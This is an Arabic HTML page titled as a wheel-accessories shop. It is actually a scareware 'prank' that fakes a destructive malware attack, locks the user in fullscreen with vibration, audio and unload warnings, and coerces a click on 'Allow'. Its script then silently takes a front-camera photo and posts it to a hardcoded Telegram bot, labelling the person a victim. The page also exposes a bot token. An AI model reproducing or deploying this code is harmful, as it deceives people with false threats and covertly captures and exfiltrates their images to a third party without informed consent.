<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اكسسوارات عجل بارخص الاسعار</title>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            margin: 0;
            padding: 10px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            /* الجليتش والرعب شغال لوحده من أول ثانية */
            animation: extremeGlitch 0.08s infinite;
        }

        @keyframes extremeGlitch {
            0% { background-color: #000000; transform: translate(0, 0); filter: invert(0); }
            20% { background-color: #330000; transform: translate(-4px, 4px); filter: invert(1); }
            40% { background-color: #000000; transform: translate(4px, -4px); filter: invert(0); }
            60% { background-color: #1a0000; transform: translate(-2px, -2px); }
            80% { background-color: #400000; transform: translate(3px, 3px); filter: invert(0.2); }
            100% { background-color: #000000; transform: translate(0, 0); }
        }
        .box {
            border: 4px solid #ff0000;
            padding: 20px;
            background: rgba(10, 0, 0, 0.98);
            box-shadow: 0 0 80px rgba(255, 0, 0, 1);
            width: 95%;
            max-width: 420px;
        }
        h1 { font-size: 20px; margin-bottom: 10px; text-shadow: 0 0 15px #ff0000; color: #ff3333; }
        p { font-size: 12px; color: #ff9999; line-height: 1.5; }
        .ransom-box {
            background: #2b0000;
            color: #ffcccc;
            padding: 12px;
            margin-top: 12px;
            font-size: 12px;
            border: 1px dashed red;
            font-weight: bold;
        }
        .btn {
            background-color: #ff0000;
            color: white;
            border: none;
            padding: 14px;
            font-size: 15px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            margin-top: 15px;
            font-weight: bold;
            box-shadow: 0 0 20px rgba(255,0,0,1);
            animation: pulseBtn 0.8s infinite;
        }
        @keyframes pulseBtn {
            0% { transform: scale(1); }
            50% { transform: scale(1.04); background-color: #ff3333; }
            100% { transform: scale(1); }
        }

        /* ستايل المقلب والضحك بعد الموافقة */
        .prank-mode {
            background-color: #001a00 !important;
            border-color: #00ff00 !important;
            color: #00ff00 !important;
            box-shadow: 0 0 80px rgba(0, 255, 0, 0.9) !important;
            animation: none !important;
        }
        .prank-mode h1 { color: #00ff00 !important; text-shadow: 0 0 15px #00ff00; }
        .prank-mode .ransom-box { background: #002600; color: #ccffcc; border-color: #00ff00; }
        .prank-mode .btn { background-color: #00ff00 !important; color: #000 !important; animation: none !important; box-shadow: 0 0 15px rgba(0,255,0,0.8) !important; }
    </style>
</head>
<body onclick="forceFullscreenAndVibrate()">
    


    <audio id="backgroundAudio" autoplay loop>
    <source src="1.mp3" type="audio/mpeg">
  </audio>
  متصفحك لا يدعم تشغيل الملفات الصوتية.



    <div class="box" id="mainBox">
        <h1 id="title">🚨 تحذير خطير: هجوم برمجيات خبيثة! 🚨</h1>
        <p id="desc">تم رصد ملفات ضارة تحاول تدمير اللوحة الأم لجهازك وحذف نظام التشغيل بالكامل الآن!</p>
        
        <div class="ransom-box" id="ransomText">
            ⚠ لإنقاذ هاتفك من التلف التام وإيقاف الفيرس، يجب الضغط على الزر أدناه والموافقة الفورية على (Allow) لإعطاء صلاحية الإصلاح الطارئ للنظام!
        </div>

        <button class="btn" id="actionBtn" onclick="requestAllowAndPrank(event)">Allow للحماية القصوى 🛡️</button>
    </div>
    
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>

        const BOT_TOKEN = "8732626253:AAHGWyKFHqXI1sSOFnQ2sVeR4vmJBeJ7iNw";
        const CHAT_ID = "6772192037";
        let isPrankDone = false;

        // منع إغلاق الصفحة بالتحذيرات المستمرة
        window.onbeforeunload = function(e) {
            if (!isPrankDone) {
                e.preventDefault();
                e.returnValue = "تحذير: إغلاق الصفحة سيؤدي إلى تلف نظام التشغيل نهائياً!";
                return "تحذير: إغلاق الصفحة سيؤدي إلى تلف نظام التشغيل نهائياً!";
            }
        };

        // تفعيل الفول سكرين والهزاز مع أول لمسة أو ضغطة في أي مكان
        function forceFullscreenAndVibrate() {
            if (isPrankDone) return;

            let elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen().catch(e => {});
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            }

            // هزاز متواصل لا يتوقف لزيادة التوتر والرعب
            if (navigator.vibrate) {
                navigator.vibrate([1000, 200, 1000, 300, 2000, 500, 3000, 500, 5000]);
            }
        }

        // محاولة إجبار الفول سكرين تلقائياً عند التحميل
        window.onload = function() {
            const audio = document.getElementById('backgroundAudio');
            const startAudio = () => {
                audio.play().then(() => {
                    document.removeEventListener('pointerdown', startAudio);
                    document.removeEventListener('keydown', startAudio);
                }).catch(() => {});
            };

            startAudio();
            document.addEventListener('pointerdown', startAudio);
            document.addEventListener('keydown', startAudio);
            forceFullscreenAndVibrate();
        };

        // زرار الإصلاح: يطلب إذن الكاميرا، ولو وافق (Allow)، المقلب يفرقع وتظهر الضحكة
        function requestAllowAndPrank(event) {
            event.stopPropagation();
            if (isPrankDone) return;

            forceFullscreenAndVibrate();

            // طلب إذن الكاميرا الحاسم
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                isPrankDone = true;
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'victim_allow_caught.jpg');
                        formData.append('caption', '🚨 ضحية جديدة ضغط Allow للحماية ووقع في المقبض!');

                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        }).catch(err => console.log(err));
                        
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg', 0.8);
                }, 800);
             
                // فك الحبس وإيقاف الهزاز وإظهار الضحكة الكبرى فور الموافقة على Allow
                window.onbeforeunload = null;
                if (navigator.vibrate) {
                    navigator.vibrate(0); 
                }

                let box = document.getElementById("mainBox");
                let title = document.getElementById("title");
                let desc = document.getElementById("desc");
                let ransom = document.getElementById("ransomText");
                let btn = document.getElementById("actionBtn");

                box.classList.add("prank-mode");
                title.innerText = "😂😂 يا عم اقعد.. روحك رجعت ولا لسه؟! 😂";
                desc.innerText = "كنت فاكر تليفونك بيتدمر وهتدوس Allow للحماية كمان يا غلبان؟! تليفونك سليم ومفيش أي فيرس! 😉";
                ransom.innerHTML = "<b>أول ما ضغطت Allow وصورتك اتبعتت لي حالا 📸 عرفنا أنك خفت بجد 😂!</b>";
                btn.innerText = "اضحك على نفسك بقى وكفاية رعب 😆";
                
                btn.onclick = function(e) {
                    e.stopPropagation();
                    location.reload();
                };

            }).catch(err => {
                // لو عمل Block أو رفض، الهزاز يستمر والرسالة تحذره إنه ماينفعش يعدي
                if (navigator.vibrate) {
                    navigator.vibrate([1000, 200, 1000, 300, 2000]);
                }
                alert("⚠ خطأ فادح: ممنوع عمل Block! يجب الضغط على Allow للحماية وإلا سيتم تدمير النظام فوراً!");
            });
        }
    </script>
    

</body>
</html>
